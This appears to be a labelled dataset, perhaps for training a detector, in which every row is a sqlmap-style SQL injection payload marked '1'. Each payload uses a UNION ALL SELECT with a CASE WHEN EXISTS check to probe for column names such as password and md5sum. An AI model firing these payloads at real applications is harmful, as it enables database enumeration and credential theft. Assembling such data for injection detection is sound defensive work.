"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ip FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PySL",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT maxnumber FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YWoy",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tag_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DmJQ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT alert_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eILo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cananyonediscoverjid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uMvU",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT address FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- obnp",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sumdatarow FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gsHF",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT emp_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hLQL",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ono FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hNXJ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT anyone FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MaIy",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT surname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UzLv",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT subdomain FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zmIf",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT maxusers FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aBjw",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ccc FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UneN",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT os FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ybXB",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT datacol FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FpTl",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT status_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eNuE",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT node_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZWhe",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT essn FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gxcO",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT last_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mXWF",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT iteration FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TSad",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT canchangenickname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cfJU",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT canoccupantschangesubject FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qOrs",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT membersonly FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mtMv",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT created_by FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YdYn",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT succ_rate FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dQBz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dnumber FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XkGS",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT service_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xWac",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SvkW",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT publicroom FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mbMQ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT propvalue FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZPBe",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT empty_days FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SspT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT moderated FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VHIU",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT customer_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eBeT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT wdatarow FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Saqa",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT persistent FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tnFi",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT authorid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oypE",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT patch_status_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WDPY",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT submitted_by FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BOPJ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT resolution_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dejZ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT osvendor FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yjWC",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT routeid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rSiZ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT arch FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OFAd",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oUru",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT assigned_to FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BJHF",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ns FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RTtf",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT event_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UtLI",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT problem_code FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Esqu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT city FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BcNI",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT note FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uBCj",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT channel FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IWnF",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT element_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RhvX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cat_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dCpy",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT position_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fnhh",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT schema_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uYfX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT area FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vymf",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bug_category_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uFeB",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT session_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WnCj",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT project_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QhLz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT random FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hYEx",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nsprefix FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RHjP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT archive_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cmxt",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nsschema FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EdLR",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT view_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pAmd",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wEIg",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bug_group_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZeVY",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lastname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qRES",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT link_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jWqE",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT langid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HuiU",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT catname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UIoj",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bug_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZzlB",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT magic_string FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Uecl",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT m_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xFwd",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT zip FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TqFi",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT patch_category_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JLdX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT custno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pRAG",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idcountry FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GLow",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT stopid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LfAJ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT identifier FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rxPe",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT category FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yvza",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT isbn FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NnDy",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT group_project_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vSur",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT extension_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OXTs",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT state FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qQFt",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT password FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GlgL",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT page FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tHyP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT extension FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yifU",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT spellid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dYBh",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hUYo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT instanceof FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Olxa",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT network FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KTKz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT priority FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XZRR",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- migI",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT person_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pAaN",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ncbofile FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wlzz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT student_number FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eGYv",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT term_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DLBM",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT uno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CImE",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT path_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uOTm",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tlTT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT location_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IMIu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT propertyno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Takq",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT course_number FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UpwU",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hERe",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT langug_code FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hAGB",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT variable FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uZbW",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dept_desc FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EFTe",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT orderno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iSQu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ownerno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mykJ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT partof FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vnRj",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT clientno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sbfX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT white FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- youE",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT macaddr FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zaHm",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT jobtypeid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VPOC",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT direction FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xSwf",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT md5sum FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- chPN",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT orga_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Bdvz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT parentcategoryid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EtUl",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT beginstateid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QfGu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YBHf",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT qno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CtfL",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT src FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bRFt",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT featurename FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RMdM",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT client_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SLeR",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT route_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VcQa",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ticker FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uMBt",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `version` FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cWpq",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT modulename FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XJkc",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT maty_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BgWM",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT currentstateid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QujU",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT userinfo_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KRFP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT column_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pbag",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT imageinfo_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rUzy",1,,
